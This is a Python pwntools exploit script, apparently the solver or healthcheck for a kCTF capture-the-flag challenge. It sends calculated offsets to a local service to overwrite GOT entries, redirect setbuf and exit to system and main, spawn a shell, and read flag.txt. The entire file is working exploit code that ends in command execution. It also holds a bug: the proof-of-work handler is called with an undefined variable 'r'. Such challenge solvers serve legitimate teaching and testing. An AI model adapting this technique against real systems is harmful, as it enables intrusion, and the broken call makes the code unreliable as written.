#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

from pwn import *

conn = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(conn.recvuntil(b'== proof-of-work: '))
if conn.recvline().startswith(b'enabled'):
    handle_pow(r)

context.binary = elf = ELF("./vuln")
libc = ELF("./libc.so.6")

setbuf_off = (elf.got.setbuf - elf.sym.buf)
stderr_off = (elf.sym.stderr - elf.sym.buf)
exit_off = (elf.got.exit - elf.sym.buf)

sys_off = (libc.sym.system - libc.sym.setbuf)
sh_off = (next(libc.search(b"/bin/sh")) - libc.sym._IO_2_1_stderr_)
main_off = (elf.sym.main - 0x1080) # unresolved exit and main are at fixed offsets from each other

conn.recvuntil(b"?")
conn.sendline(str(setbuf_off).encode())
conn.recvuntil(b"?")
conn.sendline(str(sys_off).encode())
conn.recvuntil(b"?")
conn.sendline(str(stderr_off).encode())
conn.recvuntil(b"?")
conn.sendline(str(sh_off).encode())
conn.recvuntil(b"?")
conn.sendline(str(exit_off).encode())
conn.recvuntil(b"?")
conn.sendline(str(main_off).encode())
conn.recvuntil(b"?")
conn.sendline(b"1337")
conn.recvuntil(b"?")
conn.sendline(b"1337")
conn.sendline(b"cat flag.txt")
conn.sendline(b"exit")

res = conn.recvall(timeout=1)
assert b"ictf{" in res

exit(0)
